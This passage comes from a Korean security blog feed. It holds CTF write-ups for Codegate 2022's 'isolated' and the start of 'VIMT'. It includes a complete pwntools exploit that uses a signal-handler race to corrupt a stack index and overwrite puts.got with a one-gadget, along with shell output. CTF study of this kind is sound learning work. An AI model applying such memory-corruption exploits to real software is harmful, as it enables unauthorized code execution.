class="number">0</span>);</span><br><span class="line">      add_arg2 = context-&gt;reg;</span><br><span class="line">    &#125;</span><br><span class="line">    send_locked(ppid, context, PUSH, add_arg2 + add_arg1);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">3</span>:                                   <span class="comment">// SUB [u8 flag1] [optional u32 arg1] [u8 flag2] [optional u32 arg2]</span></span><br><span class="line">                                            <span class="comment">// subtract two arguments and push</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  <span class="keyword">case</span> <span class="number">4</span>:                                   <span class="comment">// MUL [u8 flag1] [optional u32 arg1] [u8 flag2] [optional u32 arg2]</span></span><br><span class="line">                                            <span class="comment">// multiply two arguments and push</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  <span class="keyword">case</span> <span class="number">5</span>:                                   <span class="comment">// DIV [u8 flag1] [optional u32 arg1] [u8 flag2] [optional u32 arg2]</span></span><br><span class="line">                                            <span class="comment">// divide two arguments and push</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  <span class="keyword">case</span> <span class="number">6</span>:                                   <span class="comment">// CMP [u8 flag1] [optional u32 arg1] [u8 flag2] [optional u32 arg2]</span></span><br><span class="line">                                            <span class="comment">// compare two arguments and save result to eflags</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="keyword">case</span> <span class="number">9</span>:                                   <span class="comment">// CLEAN</span></span><br><span class="line">    send_locked(ppid, context, CLEAN, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">10</span>:                                  <span class="comment">// LOG [u8 arg1] [u32 optional arg2]</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  <span class="keyword">default</span>:</span><br><span class="line">    send(ppid, context, (<span class="keyword">enum</span> signal)<span class="number">9u</span>, <span class="number">0</span>);<span class="comment">// SIGKILL</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="%EB%AC%B8%EC%A0%9C-%ED%92%80%EC%9D%B4" tabindex="-1">ë¬¸ì œ í’€ì´</h2><p>ìì‹ í”„ë¡œì„¸ìŠ¤ì˜ ì‹œìŠ¤í…œ ì½œ í•„í„°ë§ìœ¼ë¡œ ì¸í•´ ì•ì„œ ì–¸ê¸‰í•œ ë°”ì™€ ê°™ì´ ë¶€ëª¨ í”„ë¡œì„¸ìŠ¤ë¥¼ ìµìŠ¤í”Œë¡œì‡í•´ì•¼ í•©ë‹ˆë‹¤. ìµìŠ¤í”Œë¡œì‡ì€ ë‹¤ìŒê³¼ ê°™ì€ ì·¨ì•½ì ì„ ë°”íƒ•ìœ¼ë¡œ ìˆ˜í–‰í•©ë‹ˆë‹¤.</p><ol><li><code>g_stack_idx</code> ì˜ ìë£Œí˜•ì´ <code>int</code> ë¡œ, <code>push_handler</code> ì™€ <code>pop_handler</code> í•¨ìˆ˜ì—ì„œ ì¶©ë¶„í•˜ì§€ ì•Šì€ ê²½ê³„ ê²€ì‚¬ë¥¼ ìˆ˜í–‰í•˜ê³  ìˆìŠµë‹ˆë‹¤.<ul><li><code>g_stack_idx</code> ì˜ ê°’ì„ ìŒìˆ˜ë¡œ ë§Œë“¤ ìˆ˜ ìˆë‹¤ë©´ ë‘ í•¨ìˆ˜ì˜ ê²½ê³„ ê²€ì‚¬ë¥¼ ëª¨ë‘ í†µê³¼í•˜ì—¬, <code>stack</code> ë³´ë‹¤ ë‚®ì€ ì£¼ì†Œì˜ ë©”ëª¨ë¦¬ì— ëŒ€í•œ ì½ê¸°ì™€ ì“°ê¸°ê°€ ê°€ëŠ¥í•©ë‹ˆë‹¤.</li></ul></li><li><code>PUSH</code> ì™€ <code>POP</code> opcodeëŠ” ë¸”ë¡œí‚¹ ë°©ì‹ì˜ <code>send_blocked</code> í•¨ìˆ˜ê°€ ì•„ë‹Œ <code>send</code> í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ê³  ìˆìŠµë‹ˆë‹¤.</li></ol><p><code>run</code> í•¨ìˆ˜ì˜ switch êµ¬ë¬¸ì„ ë³´ë©´ <code>PUSH</code> ì™€ <code>POP</code> opcodeë¥¼ ì²˜ë¦¬í•˜ëŠ” case ë¸”ë¡ì—ì„œ ë‹¨ìˆœíˆ <code>send</code> í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ì—¬ ì‹œê·¸ë„ì„ ì „ì†¡í•˜ë„ë¡ í•˜ê³  ìˆìŠµë‹ˆë‹¤. <code>send</code> í•¨ìˆ˜ëŠ” <code>send_blocked</code> í•¨ìˆ˜ì™€ ë‹¬ë¦¬ ë¶€ëª¨ í”„ë¡œì„¸ìŠ¤ì—ì„œ ì‹¤í–‰ ì¤‘ì¸ í•¸ë“¤ëŸ¬ í•¨ìˆ˜ê°€ ì¢…ë£Œí•  ë•Œê¹Œì§€ ê¸°ë‹¤ë¦¬ëŠ” ë©”ì»¤ë‹ˆì¦˜ì´ ì¡´ì¬í•˜ì§€ ì•Šì•„, ì—°ì†í•˜ì—¬ í˜¸ì¶œí•  ê²½ìš° ì˜ë„í•˜ì§€ ì•Šì€ ê²°ê³¼ë¥¼ ì¼ìœ¼í‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> ( code[op] )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0</span>:                                   <span class="comment">// PUSH [u32 arg1]</span></span><br><span class="line">    push_arg1 = *(_DWORD *)&amp;code[pc];</span><br><span class="line">    pc += <span class="number">4</span>;</span><br><span class="line">    send(ppid, context, PUSH, push_arg1);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">1</span>:                                   <span class="comment">// POP</span></span><br><span class="line">    send(ppid, context, POP, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="comment">// ...</span></span><br></pre></td></tr></table></figure><p>ì‹œê·¸ë„ í•¸ë“¤ëŸ¬ë¡œì˜ íë¦„ ì „í™˜ì€ ìœ ì € ëª¨ë“œì˜ ì½”ë“œë¥¼ ì‹¤í–‰í•˜ê³  ìˆëŠ” í•œ ì–¸ì œë‚˜ ë°œìƒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë”°ë¼ì„œ ì›ì¹™ì ìœ¼ë¡œ í•¸ë“¤ëŸ¬ í•¨ìˆ˜ëŠ” ì¬ì§„ì…ì„±ì´ ë³´ì¥ë˜ì–´ì•¼(reentrant) í•˜ë©°, ìµœì†Œí•œ ì‹œê·¸ë„ì˜ ì „ë‹¬ ìì²´ë§Œì´ë¼ë„ ë¸”ë¡œí‚¹ ë°©ì‹ìœ¼ë¡œ ì´ë£¨ì–´ì ¸ì•¼ í•©ë‹ˆë‹¤. ì—¬ê¸°ì„œ ì¬ì§„ì…ì„±ì˜ ë³´ì¥ì´ë€ í•¸ë“¤ëŸ¬ í•¨ìˆ˜ë¥¼ ì‹¤í–‰í•˜ëŠ” ë„ì¤‘ ì„ì˜ ì‹œì ì—ì„œ ì‹œê·¸ë„ì„ ë°›ì•„ í•¨ìˆ˜ ë‚´ë¶€ì—ì„œ ê°™ì€ í•¸ë“¤ëŸ¬ í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ë”ë¼ë„, ê¸°ì¡´ í•¸ë“¤ëŸ¬ í•¨ìˆ˜ì˜ ì‹¤í–‰ ê²°ê³¼ì— ì˜í–¥ì„ ì£¼ì§€ ì•Šì•„ì•¼ í•¨ì„ ì˜ë¯¸í•©ë‹ˆë‹¤.</p><p>ê·¸ëŸ¬ë‚˜ <code>push_handler</code> ì™€ <code>pop_handler</code> í•¨ìˆ˜ì—ì„œ ì´ë£¨ì–´ì§€ëŠ” <code>g_stack_idx</code> ì „ì—­ ë³€ìˆ˜ì— ëŒ€í•œ ì¦ê° ì—°ì‚°ì€ ì›ìì ì´ì§€ ì•Šì„(non-atomic) ë¿ë”ëŸ¬, ì‹œê·¸ë„ì˜ ì „ì†¡ ê³¼ì •ë„ ë¸”ë¡œí‚¹ ë°©ì‹ì„ ì‚¬ìš©í•˜ê³  ìˆì§€ ì•ŠìŠµë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´ <code>g_stack_idx</code> ì˜ ê°’ì´ 1ì´ê³  ë‘ ê°œì˜ <code>POP</code> opcodeë¥¼ íŒŒì‹±í•˜ì—¬ ì‹œê·¸ë„ì„ ì „ì†¡í•˜ëŠ” ìƒí™©ì„ ìƒê°í•´ë³´ê² ìŠµë‹ˆë‹¤. ë§Œì•½ ì „ì†¡ì´ ë¸”ë¡œí‚¹ ë°©ì‹ìœ¼ë¡œ ì´ë£¨ì–´ì¡Œë‹¤ë©´ ë‹¤ìŒê³¼ ê°™ì´ <code>pop_handler</code> ì˜ ì¡°ê±´ë¬¸ì— ì˜í•´ <code>g_stack_idx</code> ì˜ ê°’ì€ ìŒìˆ˜ê°€ ë  ìˆ˜ ì—†ìŠµë‹ˆë‹¤.</p><p><img src="/images/codegate22-isolated/1.png" alt="1.png"></p><p>ê·¸ëŸ°ë° ë¸”ë¡œí‚¹ ë°©ì‹ì´ ì•„ë‹Œ ìƒí™©ì—ì„œëŠ” <code>pop_handler</code> ì˜ ì¡°ê±´ë¬¸ì„ í†µê³¼í•œ ìƒíƒœì—ì„œ ë‹¤ìŒê³¼ ê°™ì´ ì¶”ê°€ì ì¸ ì‹œê·¸ë„ì— ì¸í•œ ì¬ì§„ì…ì´ ë°œìƒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ê²½ìš° ì¬ì§„ì…í•œ í•¸ë“¤ëŸ¬ë¥¼ í¬í•¨í•˜ì—¬ <code>g_stack_idx</code> ì— ëŒ€í•œ ì¦ê° ì—°ì‚°ì´ ë‘ ë²ˆ ëª¨ë‘ ì´ë£¨ì–´ì ¸ ê°’ì´ ìŒìˆ˜ê°€ ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p><img src="/images/codegate22-isolated/2.png" alt="2.png"></p><p><code>push_handler</code> ì™€ <code>pop_handler</code> ëŠ” ê°ê° <code>g_stack_idx</code> ê°€ 767ë³´ë‹¤ ì‘ê±°ë‚˜ ê°™ì€ì§€, 0ì´ ì•„ë‹Œì§€ë§Œ ê²€ì‚¬í•©ë‹ˆë‹¤. ë”°ë¼ì„œ ì¼ë‹¨  <code>g_stack_idx</code> ì˜ ê°’ì„ ìŒìˆ˜ë¡œ ë§Œë“¤ê³  ë‚˜ë©´ ì—°ì†ëœ <code>POP</code> opcode ë“±ìœ¼ë¡œ ì–¼ë§ˆë“ ì§€ ê°’ì„ ê°ì†Œì‹œì¼œ, <code>stack</code> ë³´ë‹¤ ë‚®ì€ ì£¼ì†Œì˜ ë©”ëª¨ë¦¬ì— ëŒ€í•œ ììœ ë¡œìš´ ì½ê¸°ì™€ ì“°ê¸°ê°€ ê°€ëŠ¥í•´ì§‘ë‹ˆë‹¤. <code>puts.got</code> ëŠ” <code>stack</code> ë³´ë‹¤ ë‚®ì€ ì£¼ì†Œì— ìˆê³  <code>puts</code> ë¼ì´ë¸ŒëŸ¬ë¦¬ í•¨ìˆ˜ì˜ ì£¼ì†Œê°€ ì €ì¥ë˜ì–´ ìˆìœ¼ë¯€ë¡œ, <code>SUB</code> opcode ë“±ì„ ì´ìš©í•˜ì—¬ oneshot ê°€ì ¯ì˜ ì£¼ì†Œë¡œ ë³€ì¡°í•˜ë©´ ì…¸ì„ íšë“í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>ë‹¤ìŒì€ ìœ„ì˜ ë‚´ìš©ì„ ë°”íƒ•ìœ¼ë¡œ ì‘ì„±í•œ ìµìŠ¤í”Œë¡œì‡ ì½”ë“œì…ë‹ˆë‹¤. 37í–‰ì€ <code>CLEAN</code> , 2ë²ˆì˜ <code>PUSH</code> , 3ë²ˆì˜ <code>POP</code> ì„ ë°˜ë³µí•˜ì—¬ <code>g_stack_idx</code> ì˜ ê°’ì´ ìŒìˆ˜ê°€ ë˜ë„ë¡ í•©ë‹ˆë‹¤. 46í–‰ì€ ë¸”ë¡œí‚¹ ë°©ì‹ì˜ <code>POP</code> ì„ ë°˜ë³µí•˜ì—¬ <code>puts.got</code> ë¥¼ ì°¸ì¡°í•  ìˆ˜ ìˆë„ë¡ <code>g_stack_idx</code> ë¥¼ ê°ì†Œì‹œí‚¤ëŠ”ë°, ë°˜ë³µ íšŸìˆ˜ëŠ” ì‹¤í–‰ í™˜ê²½ì— ë”°ë¼ ì‹œí–‰ì°©ì˜¤ë¥¼ ê±°ì³ì•¼ í•©ë‹ˆë‹¤. 52í–‰ì€ <code>SUB</code> opcodeë¥¼ ì‚¬ìš©í•´ <code>puts.got</code> ì— oneshot ê°€ì ¯ì˜ ì£¼ì†Œë¥¼ ëŒ€ì…í•©ë‹ˆë‹¤. ìµìŠ¤í”Œë¡œì‡ ì½”ë“œë¥¼ ì„±ê³µí•  ë•Œê¹Œì§€ ìˆ˜ì°¨ë¡€ ì‹¤í–‰í•˜ë©´ ì…¸ì„ íšë“í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;localhost&quot;</span>, <span class="number">7777</span>)</span><br><span class="line"><span class="comment"># r = process(&quot;./isolated&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pop</span>():</span><br><span class="line">    <span class="keyword">return</span> p8(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__opcode</span>(<span class="params">op, pop1, pop2, args=[<span class="number">0</span>, <span class="number">0</span>]</span>):</span><br><span class="line">    s = p8(op) + (p8(<span class="number">0x55</span>) <span class="keyword">if</span> pop1 <span class="keyword">else</span> p8(<span class="number">0x66</span>) + p32(args[<span class="number">0</span>]))</span><br><span class="line">    s += (p8(<span class="number">0x55</span>) <span class="keyword">if</span> pop2 <span class="keyword">else</span> p8(<span class="number">0x66</span>) + p32(args[<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub</span>(<span class="params">pop1, pop2, args=[<span class="number">0</span>, <span class="number">0</span>]</span>):</span><br><span class="line">    <span class="keyword">return</span> __opcode(<span class="number">3</span>, pop1, pop2, args)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmp</span>(<span class="params">pop1, pop2, args=[<span class="number">0</span>, <span class="number">0</span>]</span>):</span><br><span class="line">    <span class="keyword">return</span> __opcode(<span class="number">6</span>, pop1, pop2, args)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clean</span>():</span><br><span class="line">    <span class="keyword">return</span> p8(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">log</span>(<span class="params">pop, arg=<span class="number">0</span></span>):</span><br><span class="line">    <span class="keyword">return</span> p8(<span class="number">10</span>) + (p8(<span class="number">0x55</span>) <span class="keyword">if</span> pop <span class="keyword">else</span> p8(<span class="number">0x66</span>) + p32(arg))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># start race</span></span><br><span class="line">    payload = log(<span class="literal">False</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        payload += clean()</span><br><span class="line">        payload += sub(<span class="literal">False</span>, <span class="literal">False</span>, [<span class="number">0</span>, <span class="number">0</span>])</span><br><span class="line">        payload += sub(<span class="literal">False</span>, <span class="literal">False</span>, [<span class="number">0</span>, <span class="number">0</span>])</span><br><span class="line">        payload += pop()</span><br><span class="line">        payload += pop()</span><br><span class="line">        payload += pop()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># set stack_idx to -59</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">27</span>):</span><br><span class="line">        payload += cmp(<span class="literal">True</span>, <span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        payload += sub(<span class="literal">True</span>, <span class="literal">False</span>, [<span class="number">0</span>, <span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># set puts.got to oneshot</span></span><br><span class="line">    payload += sub(<span class="literal">True</span>, <span class="literal">False</span>, [<span class="number">0</span>, <span class="number">0x3166e</span>])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># trigger oneshot</span></span><br><span class="line">    payload += log(<span class="literal">False</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    r.sendafter(<span class="string">b&quot;opcodes &gt;&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ ./ex.py</span><br><span class="line">[+] Opening connection to localhost on port 7777: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">[!] I prepared <span class="built_in">log</span> feature <span class="keyword">for</span> you :)</span><br><span class="line"><span class="comment"># ...</span></span><br><span class="line">[*] POP stack[0xffffffc5] == 0xf7a62aa0</span><br><span class="line">[*] PUSH stack[0xffffffc5] = 0xf7a31432</span><br><span class="line">$ <span class="built_in">id</span></span><br><span class="line">uid=1000(ctf) gid=1000(ctf) <span class="built_in">groups</span>=1000(ctf)</span><br></pre></td></tr></table></figure><h2 id="%EC%B0%B8%EA%B3%A0%EC%9E%90%EB%A3%8C" tabindex="-1">ì°¸ê³ ìë£Œ</h2><p>[1] M. Dowd, J. McDonald and J. Schuh, â€œChapter 13. Synchronization and State,â€ in <em>The Art of Software Security Assessment: Identifying and Preventing Software Vulnerabilities</em>. Boston, MA: Addison-Wesley, 2006, pp. 797-821.</p><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">]]></content:encoded>
      
      
      <category domain="https://juhyun167.github.io/categories/Security/">Security</category>
      
      <category domain="https://juhyun167.github.io/categories/Security/CTF/">CTF</category>
      
      
      
      <comments>https://juhyun167.github.io/2022/07/06/codegate22-isolated/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Codegate CTF 2022] VIMT</title>
      <link>https://juhyun167.github.io/2022/07/05/codegate22-vimt/</link>
      <guid>https://juhyun167.github.io/2022/07/05/codegate22-vimt/</guid>
      <pubDate>Tue, 05 Jul 2022 22:33:02 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;%EA%B0%9C%EC%9A%94&quot; tabindex=&quot;-1&quot;&gt;ê°œìš”&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Monkeys help you&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;a href=&quot;/uploads/codegate22-vimt/ch</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="%EA%B0%9C%EC%9A%94" tabindex="-1">ê°œìš”</h2><blockquote><p>Monkeys help you</p></blockquote><p><a href="/uploads/codegate22-vimt/chall.zip">chall.zip</a></p><h2 id="%EB%AC%B8%EC%A0%9C-%EB%B6%84%EC%84%9D" tabindex="-1">ë¬¸ì œ ë¶„ì„</h2><p>64ë¹„íŠ¸ x86_64 ë°”ì´ë„ˆë¦¬ <code>app</code> ê³¼ <code>Dockerfile</code> ë“±ì´ ì£¼ì–´ì§‘ë‹ˆë‹¤. ë°”ì´ë„ˆë¦¬ëŠ” ì‹¬ë³¼ì´ ìˆê³ , NX ë³´í˜¸ ê¸°ë²•ì´ ì ìš©ë˜ì–´ ìˆìŠµë‹ˆë‹¤.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec app</span><br><span class="line">[*] <span class="string">&#x27;/home/user/study/ctf/codegate22/vimt/app&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p><code>Dockerfile</code> ì„ ì‚´í´ë³´ë©´ ì„œë²„ì—ì„œ ë°”ì´ë„ˆë¦¬ì— setuid ê¶Œí•œì„ ë¶€ì—¬í•˜ê³  ìˆìœ¼ë©°, SSH ì ‘ì† ê°€ëŠ¥í•œ ê³„ì •ê³¼ ë¹„ë°€ë²ˆí˜¸ë¥¼ ì œê³µí•©ë‹ˆë‹¤. ë”°ë¼ì„œ ì£¼ì–´ì§„ ë°”ì´ë„ˆë¦¬ë¥¼ í†µí•˜ì—¬ root ê¶Œí•œì˜ ì…¸ì„ íšë“í•˜ëŠ” ê²ƒì´ ëª©í‘œì„ì„ ì¶”ì¸¡í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ...</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">echo</span> <span class="string">&quot;/home/ctf/app&quot;</span> &gt; /home/ctf/.bash_profile</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">echo</span> <span class="string">&quot;exit&quot;</span> &gt;&gt; /home/ctf/.bash_profile</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chown</span> root:root /home/ctf/app</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chown</span> root:root /home/ctf/tmp</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> 640 /home/ctf/app</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> +x /home/ctf/app</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> u+s /home/ctf/app</span></span><br><span class="line"><span class="comment"># ...</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">echo</span> <span class="string">&#x27;ctf:ctf1234_smiley&#x27;</span> | chpasswd</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> chsh -s /bin/bash ctf</span></span><br></pre></td></tr></table></figure><p>ë°”ì´ë„ˆë¦¬ë¥¼ ì‹¤í–‰í•˜ë©´ ë¬¸ì œì˜ ì´ë¦„ì²˜ëŸ¼ Vim ì—ë””í„°ì™€ ìœ ì‚¬í•œ í™”ë©´ì„ ì¶œë ¥í•˜ëŠ”ë°, â€œhello worldâ€ ë¬¸ìì—´ì„ ì…ë ¥í–ˆë”ë‹ˆ ê° ë¬¸ì ë’¤ì— ì“°ë ˆê¸° ê°’ì„ ë§ë¶™ì…ë‹ˆë‹¤.</p><p><img src="/images/codegate22-vimt/1.png" alt="1.png"></p><p><code>main</code> í•¨ìˆ˜ì—ì„œ í•µì‹¬ì ì¸ ë¶€ë¶„ë§Œ ì‚´í´ë³´ë©´ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤. 7í–‰ì—ì„œ <code>init</code> í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ì—¬ ê°ì¢… ì „ì—­ ë³€ìˆ˜ë¥¼ ì„¤ì •í•©ë‹ˆë‹¤. 15í–‰ì—ì„œ <code>getch</code> í•¨ìˆ˜ë¡œ ë¬¸ìë¥¼ ì…ë ¥ë°›ì•„ switch-case êµ¬ë¬¸ì— ë„˜ê¹ë‹ˆë‹¤. ë¬¸ìê°€ Backspaceì¸ ê²½ìš° <code>deleteKey</code> í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ê³ , ì¼ë°˜ ë¬¸ìì˜ ê²½ìš° <code>inputKey</code> í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ì—¬ ì²˜ë¦¬í•©ë‹ˆë‹¤. ë¬¸ìê°€ Escì¸ ê²½ìš° Vimì˜ ëª…ë ¹ ëª¨ë“œ(command mode)ì™€ ê°™ì´ <code>cmd</code> ì— ì¶”ê°€ì ìœ¼ë¡œ ì»¤ë§¨ë“œë¥¼ ì…ë ¥ë°›ê³ , 52í–‰ë¶€í„° í•´ë‹¹í•˜ëŠ” ì»¤ë§¨ë“œì˜ í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•©ë‹ˆë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  cmd = (<span class="type">char</span> *)<span class="built_in">calloc</span>(<span class="number">1uLL</span>, <span class="number">256uLL</span>);</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  init();</span><br><span class="line">  setuid(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  